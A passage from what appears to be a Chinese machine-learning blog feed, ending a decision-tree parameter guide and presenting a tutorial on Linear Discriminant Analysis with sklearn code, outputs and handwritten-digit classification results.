class="markdownIt-Anchor" href="#24-重要知识点">#</a> 2.4 重要知识点</h2><h3 id="243-重要参数"><a class="markdownIt-Anchor" href="#243-重要参数">#</a> 2.4.3 重要参数</h3><h4 id="2431-criterion"><a class="markdownIt-Anchor" href="#2431-criterion">#</a> 2.4.3.1 criterion</h4><p>Criterion 这个参数正是用来决定模型特征选择的计算方法的。sklearn 提供了两种选择：</p><p>输入”entropy“，使用信息熵（Entropy）</p><p>输入”gini“，使用基尼系数（Gini Impurity）</p><h4 id="2432-random_state-splitter"><a class="markdownIt-Anchor" href="#2432-random_state-splitter">#</a> 2.4.3.2 random_state &amp; splitter</h4><p>random_state 用来设置分枝中的随机模式的参数，默认 None，在高维度时随机性会表现更明显。splitter 也是用来控制决策树中的随机选项的，有两种输入值，输入”best&quot;，决策树在分枝时虽然随机，但是还是会优先选择更重要的特征进行分枝（重要性可以通过属性 feature_importances_查看），输入 “random&quot;，决策树在分枝时会更加随机，树会因为含有更多的不必要信息而更深更大，并因这些不必要信息而降低对训练集的拟合。</p><h4 id="2433-max_depth"><a class="markdownIt-Anchor" href="#2433-max_depth">#</a> 2.4.3.3 max_depth</h4><p>限制树的最大深度，超过设定深度的树枝全部剪掉。这是用得最广泛的剪枝参数，在高维度低样本量时非常有效。决策树多生长一层，对样本量的需求会增加一倍，所以限制树深度能够有效地限制过拟合。</p><h4 id="2434-min_samples_leaf"><a class="markdownIt-Anchor" href="#2434-min_samples_leaf">#</a> 2.4.3.4 min_samples_leaf</h4><p>min_samples_leaf 限定，一个节点在分枝后的每个子节点都必须包含至少 min_samples_leaf 个训练样本，否则分枝就不会发生，或者，分枝会朝着满足每个子节点都包含 min_samples_leaf 个样本的方向去发生。一般搭配 max_depth 使用，在回归树中有神奇的效果，可以让模型变得更加平滑。这个参数的数量设置得太小会引起过拟合，设置得太大就会阻止模型学习数据。</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于线性判别模型的分类</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E7%BA%BF%E6%80%A7%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%88%86%E7%B1%BB/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E7%BA%BF%E6%80%A7%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="1前言lda算法简介和应用"><a class="markdownIt-Anchor" href="#1前言lda算法简介和应用">#</a> 1. 前言：LDA 算法简介和应用</h1><h2 id="11算法简介"><a class="markdownIt-Anchor" href="#11算法简介">#</a> 1.1. 算法简介</h2><p>线性判别模型（LDA）在模式识别领域（比如人脸识别等图形图像识别领域）中有非常广泛的应用。LDA 是一种监督学习的降维技术，也就是说它的数据集的每个样本是有类别输出的。这点和 PCA 不同。PCA 是不考虑样本类别输出的无监督降维技术。LDA 的思想可以用一句话概括，就是 “投影后类内方差最小，类间方差最大”。我们要将数据在低维度上进行投影，投影后希望每一种类别数据的投影点尽可能的接近，而不同类别的数据的类别中心之间的距离尽可能的大。即：将数据投影到维度更低的空间中，使得投影后的点，会形成按类别区分，一簇一簇的情况，相同类别的点，将会在投影后的空间中更接近方法。</p><p>LDA 算法的主要优点：<br>1. 在降维过程中可以使用类别的先验知识经验，而像 PCA 这样的无监督学习则无法使用类别先验知识；<br>2.LDA 在样本分类信息依赖均值而不是方差的时候，比 PCA 之类的算法较优。</p><p>LDA 算法的主要缺点：<br>1.LDA 不适合对非高斯分布样本进行降维，PCA 也有这个问题<br> 2.LDA 降维最多降到类别数 k-1 的维数，如果我们降维的维度大于 k-1，则不能使用 LDA。当然目前有一些 LDA 的进化版算法可以绕过这个问题<br> 3.LDA 在样本分类信息依赖方差而不是均值的时候，降维效果不好<br> 4.LDA 可能过度拟合数据，</p><h2 id="12算法应用"><a class="markdownIt-Anchor" href="#12算法应用">#</a> 1.2. 算法应用</h2><p>LDA 在模式识别领域（比如人脸识别，舰艇识别等图形图像识别领域）中有非常广泛的应用，因此我们有必要了解一下它的算法原理。不过在学习 LDA 之前，我们有必要将其与自然语言处理领域中的 LDA 区分开，在自然语言处理领域，LDA 是隐含狄利克雷分布（Latent DIrichlet Allocation，简称 LDA），它是一种处理文档的主题模型，我们本文讨论的是线性判别分析，因此后面所说的 LDA 均为线性判别分析。</p><p>LDA 除了可以用于降维以外，还可以用于分类。一个常见的 LDA 分类基本思想是假设各个类别的样本数据符合高斯分布，这样利用 LDA 进行投影后，可以利用极大似然估计计算各个类别投影数据的均值和方差，进而得到该类别高斯分布的概率密度函数。当一个新的样本到来后，我们可以将它投影，然后将投影后的样本特征分别带入各个类别的高斯分布概率密度函数，计算它属于这个类别的概率，最大的概率对应的类别即为预测类别。</p><h1 id="2学习目标"><a class="markdownIt-Anchor" href="#2学习目标">#</a> 2. 学习目标</h1><ul><li>掌握 LDA 算法基本原理</li><li>掌握利用 LDA 进行代码实战</li></ul><h1 id="3代码流程"><a class="markdownIt-Anchor" href="#3代码流程">#</a> 3. 代码流程</h1><h3 id="part-1-demo实践"><a class="markdownIt-Anchor" href="#part-1-demo实践">#</a> Part 1 Demo 实践</h3><ul><li>Step1: 库函数导入</li><li>Step2: 模型训练</li><li>Step3: 模型参数查看</li><li>Step4: 数据和模型可视化</li><li>Step5: 模型预测</li></ul><h3 id="part-2-基于lda手写数字分类实践"><a class="markdownIt-Anchor" href="#part-2-基于lda手写数字分类实践">#</a> Part 2 基于 LDA 手写数字分类实践</h3><ul><li>Step1: 库函数导入</li><li>Step2: 数据读取 / 载入</li><li>Step3: 数据信息简单查看与可视化</li><li>Step4: 利用 LDA 在手写数字上进行训练和预测</li></ul><h1 id="4代码实战"><a class="markdownIt-Anchor" href="#4代码实战">#</a> 4. 代码实战</h1><h2 id="41-demo实践"><a class="markdownIt-Anchor" href="#41-demo实践">#</a> 4.1 Demo 实践</h2><h4 id="step1库函数导入"><a class="markdownIt-Anchor" href="#step1库函数导入">#</a> Step1: 库函数导入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础数组运算库导入</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="comment"># 画图库导入</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="comment"># 导入三维显示工具</span></span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="comment"># 导入LDA模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.discriminant_analysis <span class="keyword">import</span> LinearDiscriminantAnalysis</span><br><span class="line"><span class="comment"># 导入demo数据制作方法</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_classification</span><br></pre></td></tr></table></figure><h4 id="step2模型训练"><a class="markdownIt-Anchor" href="#step2模型训练">#</a> Step2: 模型训练</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 制作四个类别的数据，每个类别100个样本</span></span><br><span class="line">X, y = make_classification(n_samples=<span class="number">1000</span>, n_features=<span class="number">3</span>, n_redundant=<span class="number">0</span>,</span><br><span class="line">                           n_classes=<span class="number">4</span>, n_informative=<span class="number">2</span>, n_clusters_per_class=<span class="number">1</span>,</span><br><span class="line">                           class_sep=<span class="number">3</span>, random_state=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 将四个类别的数据进行三维显示</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig, rect=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], elev=<span class="number">20</span>, azim=<span class="number">20</span>)</span><br><span class="line">ax.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], X[:, <span class="number">2</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  import sys</code></pre><p><img "" class="lazyload placeholder" data-original="output_3_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立 LDA 模型</span></span><br><span class="line">lda = LinearDiscriminantAnalysis()</span><br><span class="line"><span class="comment"># 进行模型训练</span></span><br><span class="line">lda.fit(X, y)</span><br></pre></td></tr></table></figure><pre><code>LinearDiscriminantAnalysis()</code></pre><h4 id="step3模型参数查看"><a class="markdownIt-Anchor" href="#step3模型参数查看">#</a> Step3: 模型参数查看</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 LDA 模型的参数</span></span><br><span class="line">lda.get_params()</span><br></pre></td></tr></table></figure><pre><code>&#123;'covariance_estimator': None, 'n_components': None, 'priors': None, 'shrinkage': None, 'solver': 'svd', 'store_covariance': False, 'tol': 0.0001&#125;</code></pre><h4 id="step4数据和模型可视化"><a class="markdownIt-Anchor" href="#step4数据和模型可视化">#</a> Step4: 数据和模型可视化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行模型预测</span></span><br><span class="line">X_new = lda.transform(X)</span><br><span class="line"><span class="comment"># 可视化预测数据</span></span><br><span class="line">plt.scatter(X_new[:, <span class="number">0</span>], X_new[:, <span class="number">1</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_8_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><h4 id="step5模型预测"><a class="markdownIt-Anchor" href="#step5模型预测">#</a> Step5: 模型预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行新的测试数据测试</span></span><br><span class="line">a = np.array([[-<span class="number">1</span>, <span class="number">0.1</span>, <span class="number">0.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别是: &quot;</span>, lda.predict(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别概率分别是: &quot;</span>, lda.predict_proba(a))</span><br><span class="line"></span><br><span class="line">a = np.array([[-<span class="number">12</span>, -<span class="number">100</span>, -<span class="number">91</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别是: &quot;</span>, lda.predict(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别概率分别是: &quot;</span>, lda.predict_proba(a))</span><br><span class="line"></span><br><span class="line">a = np.array([[-<span class="number">12</span>, -<span class="number">0.1</span>, -<span class="number">0.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别是: &quot;</span>, lda.predict(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别概率分别是: &quot;</span>, lda.predict_proba(a))</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="number">0.1</span>, <span class="number">90.1</span>, <span class="number">9.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别是: &quot;</span>, lda.predict(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a&#125;</span> 类别概率分别是: &quot;</span>, lda.predict_proba(a))</span><br></pre></td></tr></table></figure><pre><code>[[-1.   0.1  0.1]] 类别是:  [0][[-1.   0.1  0.1]] 类别概率分别是:  [[9.37611354e-01 1.88760664e-05 3.36891510e-02 2.86806189e-02]][[ -12 -100  -91]] 类别是:  [1][[ -12 -100  -91]] 类别概率分别是:  [[1.08769337e-028 1.00000000e+000 1.54515810e-221 9.05666876e-183]][[-12.   -0.1  -0.1]] 类别是:  [2][[-12.   -0.1  -0.1]] 类别概率分别是:  [[1.60268201e-07 1.46912978e-39 9.99999840e-01 3.57001075e-28]][[ 0.1 90.1  9.1]] 类别是:  [3][[ 0.1 90.1  9.1]] 类别概率分别是:  [[8.42065614e-08 9.45021749e-11 8.63060269e-02 9.13693889e-01]]</code></pre><h3 id="part-2-基于lda手写数字分类实践-2"><a class="markdownIt-Anchor" href="#part-2-基于lda手写数字分类实践-2">#</a> Part 2 基于 LDA 手写数字分类实践 ¶</h3><h4 id="step1库函数导入-2"><a class="markdownIt-Anchor" href="#step1库函数导入-2">#</a> Step1: 库函数导入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入手写数据集 MNIST</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_digits</span><br><span class="line"><span class="comment"># 导入训练集分割方法</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="comment"># 导入LDA模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.discriminant_analysis <span class="keyword">import</span> LinearDiscriminantAnalysis</span><br><span class="line"><span class="comment"># 导入预测指标计算函数和混淆矩阵计算函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report, confusion_matrix</span><br><span class="line"><span class="comment"># 导入绘图包</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br></pre></td></tr></table></figure><ul><li>Step2: 数据读取 / 载入</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入MNIST数据集</span></span><br><span class="line">mnist = load_digits()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看数据集信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The Mnist dataeset:\n&#x27;</span>,mnist)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据为训练集和测试集</span></span><br><span class="line">x, test_x, y, test_y = train_test_split(mnist.data, mnist.target, </span><br><span class="line">                                        test_size=<span class="number">0.1</span>, random_state=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><pre><code>The Mnist dataeset: &#123;'data': array([[ 0.,  0.,  5., ...,  0.,  0.,  0.],       [ 0.,  0.,  0., ..., 10.,  0.,  0.],       [ 0.,  0.,  0., ..., 16.,  9.,  0.],       ...,       [ 0.,  0.,  1., ...,  6.,  0.,  0.],       [ 0.,  0.,  2., ..., 12.,  0.,  0.],       [ 0.,  0., 10., ..., 12.,  1.,  0.]]), 'target': array([0, 1, 2, ..., 8, 9, 8]), 'frame': None, 'feature_names': ['pixel_0_0', 'pixel_0_1', 'pixel_0_2', 'pixel_0_3', 'pixel_0_4', 'pixel_0_5', 'pixel_0_6', 'pixel_0_7', 'pixel_1_0', 'pixel_1_1', 'pixel_1_2', 'pixel_1_3', 'pixel_1_4', 'pixel_1_5', 'pixel_1_6', 'pixel_1_7', 'pixel_2_0', 'pixel_2_1', 'pixel_2_2', 'pixel_2_3', 'pixel_2_4', 'pixel_2_5', 'pixel_2_6', 'pixel_2_7', 'pixel_3_0', 'pixel_3_1', 'pixel_3_2', 'pixel_3_3', 'pixel_3_4', 'pixel_3_5', 'pixel_3_6', 'pixel_3_7', 'pixel_4_0', 'pixel_4_1', 'pixel_4_2', 'pixel_4_3', 'pixel_4_4', 'pixel_4_5', 'pixel_4_6', 'pixel_4_7', 'pixel_5_0', 'pixel_5_1', 'pixel_5_2', 'pixel_5_3', 'pixel_5_4', 'pixel_5_5', 'pixel_5_6', 'pixel_5_7', 'pixel_6_0', 'pixel_6_1', 'pixel_6_2', 'pixel_6_3', 'pixel_6_4', 'pixel_6_5', 'pixel_6_6', 'pixel_6_7', 'pixel_7_0', 'pixel_7_1', 'pixel_7_2', 'pixel_7_3', 'pixel_7_4', 'pixel_7_5', 'pixel_7_6', 'pixel_7_7'], 'target_names': array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]), 'images': array([[[ 0.,  0.,  5., ...,  1.,  0.,  0.],        [ 0.,  0., 13., ..., 15.,  5.,  0.],        [ 0.,  3., 15., ..., 11.,  8.,  0.],        ...,        [ 0.,  4., 11., ..., 12.,  7.,  0.],        [ 0.,  2., 14., ..., 12.,  0.,  0.],        [ 0.,  0.,  6., ...,  0.,  0.,  0.]],       [[ 0.,  0.,  0., ...,  5.,  0.,  0.],        [ 0.,  0.,  0., ...,  9.,  0.,  0.],        [ 0.,  0.,  3., ...,  6.,  0.,  0.],        ...,        [ 0.,  0.,  1., ...,  6.,  0.,  0.],        [ 0.,  0.,  1., ...,  6.,  0.,  0.],        [ 0.,  0.,  0., ..., 10.,  0.,  0.]],       [[ 0.,  0.,  0., ..., 12.,  0.,  0.],        [ 0.,  0.,  3., ..., 14.,  0.,  0.],        [ 0.,  0.,  8., ..., 16.,  0.,  0.],        ...,        [ 0.,  9., 16., ...,  0.,  0.,  0.],        [ 0.,  3., 13., ..., 11.,  5.,  0.],        [ 0.,  0.,  0., ..., 16.,  9.,  0.]],       ...,       [[ 0.,  0.,  1., ...,  1.,  0.,  0.],        [ 0.,  0., 13., ...,  2.,  1.,  0.],        [ 0.,  0., 16., ..., 16.,  5.,  0.],        ...,        [ 0.,  0., 16., ..., 15.,  0.,  0.],        [ 0.,  0., 15., ..., 16.,  0.,  0.],        [ 0.,  0.,  2., ...,  6.,  0.,  0.]],       [[ 0.,  0.,  2., ...,  0.,  0.,  0.],        [ 0.,  0., 14., ..., 15.,  1.,  0.],        [ 0.,  4., 16., ..., 16.,  7.,  0.],        ...,        [ 0.,  0.,  0., ..., 16.,  2.,  0.],        [ 0.,  0.,  4., ..., 16.,  2.,  0.],        [ 0.,  0.,  5., ..., 12.,  0.,  0.]],       [[ 0.,  0., 10., ...,  1.,  0.,  0.],        [ 0.,  2., 16., ...,  1.,  0.,  0.],        [ 0.,  0., 15., ..., 15.,  0.,  0.],        ...,        [ 0.,  4., 16., ..., 16.,  6.,  0.],        [ 0.,  8., 16., ..., 16.,  8.,  0.],        [ 0.,  1.,  8., ..., 12.,  1.,  0.]]]), 'DESCR': &quot;.. _digits_dataset:\n\nOptical recognition of handwritten digits dataset\n--------------------------------------------------\n\n**Data Set Characteristics:**\n\n    :Number of Instances: 1797\n    :Number of Attributes: 64\n    :Attribute Information: 8x8 image of integer pixels in the range 0..16.\n    :Missing Attribute Values: None\n    :Creator: E. Alpaydin (alpaydin '@' boun.edu.tr)\n    :Date: July; 1998\n\nThis is a copy of the test set of the UCI ML hand-written digits datasets\nhttps://archive.ics.uci.edu/ml/datasets/Optical+Recognition+of+Handwritten+Digits\n\nThe data set contains images of hand-written digits: 10 classes where\neach class refers to a digit.\n\nPreprocessing programs made available by NIST were used to extract\nnormalized bitmaps of handwritten digits from a preprinted form. From a\ntotal of 43 people, 30 contributed to the training set and different 13\nto the test set. 32x32 bitmaps are divided into nonoverlapping blocks of\n4x4 and the number of on pixels are counted in each block. This generates\nan input matrix of 8x8 where each element is an integer in the range\n0..16. This reduces dimensionality and gives invariance to small\ndistortions.\n\nFor info on NIST preprocessing routines, see M. D. Garris, J. L. Blue, G.\nT. Candela, D. L. Dimmick, J. Geist, P. J. Grother, S. A. Janet, and C.\nL. Wilson, NIST Form-Based Handprint Recognition System, NISTIR 5469,\n1994.\n\n.. topic:: References\n\n  - C. Kaynak (1995) Methods of Combining Multiple Classifiers and Their\n    Applications to Handwritten Digit Recognition, MSc Thesis, Institute of\n    Graduate Studies in Science and Engineering, Bogazici University.\n  - E. Alpaydin, C. Kaynak (1998) Cascading Classifiers, Kybernetika.\n  - Ken Tang and Ponnuthurai N. Suganthan and Xi Yao and A. Kai Qin.\n    Linear dimensionalityreduction using relevance weighted LDA. School of\n    Electrical and Electronic Engineering Nanyang Technological University.\n    2005.\n  - Claudio Gentile. A New Approximate Maximal Margin Classification\n    Algorithm. NIPS. 2000.\n&quot;&#125;</code></pre><ul><li>Step3: 数据信息简单查看与可视化</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 输出示例图像</span></span><br><span class="line">images = <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(dpi=<span class="number">100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> images:</span><br><span class="line">    plt.subplot(<span class="number">330</span> + <span class="number">1</span> + i)</span><br><span class="line">    plt.imshow(x[i].reshape(<span class="number">8</span>, <span class="number">8</span>), cmap = matplotlib.cm.binary,interpolation=<span class="string">&quot;nearest&quot;</span>)</span><br><span class="line"><span class="comment"># show the plot</span></span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_16_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><ul><li>Step4: 利用 LDA 在手写数字上进行训练和预测</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立 LDA 模型</span></span><br><span class="line">m_lda = LinearDiscriminantAnalysis()</span><br><span class="line"><span class="comment"># 进行模型训练</span></span><br><span class="line">m_lda.fit(x, y)</span><br></pre></td></tr></table></figure><pre><code>LinearDiscriminantAnalysis()</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行模型预测</span></span><br><span class="line">x_new = m_lda.transform(x)</span><br><span class="line"><span class="comment"># 可视化预测数据</span></span><br><span class="line">plt.scatter(x_new[:, <span class="number">0</span>], x_new[:, <span class="number">1</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=y)</span><br><span class="line">plt.title(<span class="string">&#x27;MNIST with LDA Model&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_19_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行测试集数据的类别预测</span></span><br><span class="line">y_test_pred = m_lda.predict(test_x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试集的真实标签:\n&quot;</span>, test_y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试集的预测标签:\n&quot;</span>, y_test_pred)</span><br></pre></td></tr></table></figure><pre><code>测试集的真实标签: [4 0 9 1 4 7 1 5 1 6 6 7 6 1 5 5 4 6 2 7 4 6 4 1 5 2 9 5 4 6 5 6 3 4 0 9 9 8 4 6 8 8 5 7 9 6 9 6 1 3 0 1 9 7 3 3 1 1 8 8 9 8 5 4 4 7 3 5 8 4 3 1 3 8 7 3 3 0 8 7 2 8 5 3 8 7 6 4 6 2 2 0 1 1 5 3 5 7 6 8 2 2 6 4 6 7 3 7 3 9 4 7 0 3 5 8 5 0 3 9 2 7 3 2 0 8 1 9 2 1 9 1 0 3 4 3 0 9 3 2 2 7 3 1 6 7 2 8 3 1 1 6 4 8 2 1 8 4 1 3 1 1 9 5 4 8 7 4 8 9 5 7 6 9 0 0 4 0 0 4]测试集的预测标签: [4 0 9 1 8 7 1 5 1 6 6 7 6 2 5 5 8 6 2 7 4 6 4 1 5 2 9 5 4 6 5 6 3 4 0 9 9 8 4 6 8 1 5 7 9 6 9 6 1 3 0 1 9 7 3 3 1 1 8 8 9 8 5 8 4 9 3 5 8 4 3 9 3 8 7 3 3 0 8 7 2 8 5 3 8 7 6 4 6 2 2 0 1 1 5 3 5 7 1 8 2 2 6 4 6 7 3 7 3 9 4 7 0 3 5 1 5 0 3 9 2 7 3 2 0 8 1 9 2 1 9 9 0 3 4 3 0 8 3 2 2 7 3 1 6 7 2 8 3 1 1 6 4 8 2 1 8 4 1 3 1 1 9 5 4 9 7 4 8 9 5 7 6 9 6 0 4 0 0 9]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行预测结果指标统计 统计每一类别的预测准确率、召回率、F1分数</span></span><br><span class="line"><span class="built_in">print</span>(classification_report(test_y, y_test_pred))</span><br></pre></td></tr></table></figure><pre><code>              precision    recall  f1-score   support           0       1.00      0.93      0.96        14           1       0.86      0.86      0.86        22           2       0.93      1.00      0.97        14           3       1.00      1.00      1.00        22           4       1.00      0.81      0.89        21           5       1.00      1.00      1.00        16           6       0.94      0.94      0.94        18           7       1.00      0.94      0.97        18           8       0.80      0.84      0.82        19           9       0.75      0.94      0.83        16    accuracy                           0.92       180   macro avg       0.93      0.93      0.93       180weighted avg       0.93      0.92      0.92       180</code></pre><p>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算混淆矩阵</span></span><br><span class="line">C2 = confusion_matrix(test_y, y_test_pred)</span><br><span class="line"><span class="comment"># 打混淆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(C2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将混淆矩阵以热力图的防线显示</span></span><br><span class="line">sns.<span class="built_in">set</span>()</span><br><span class="line">f, ax = plt.subplots()</span><br><span class="line"><span class="comment"># 画热力图</span></span><br><span class="line">sns.heatmap(C2, cmap=<span class="string">&quot;YlGnBu_r&quot;</span>, annot=<span class="literal">True</span>, ax=ax)  </span><br><span class="line"><span class="comment"># 标题 </span></span><br><span class="line">ax.set_title(<span class="string">&#x27;confusion matrix&#x27;</span>)</span><br><span class="line"><span class="comment"># x轴为预测类别</span></span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;predict&#x27;</span>)  </span><br><span class="line"><span class="comment"># y轴实际类别</span></span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;true&#x27;</span>)  </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>[[13  0  0  0  0  0  1  0  0  0] [ 0 19  1  0  0  0 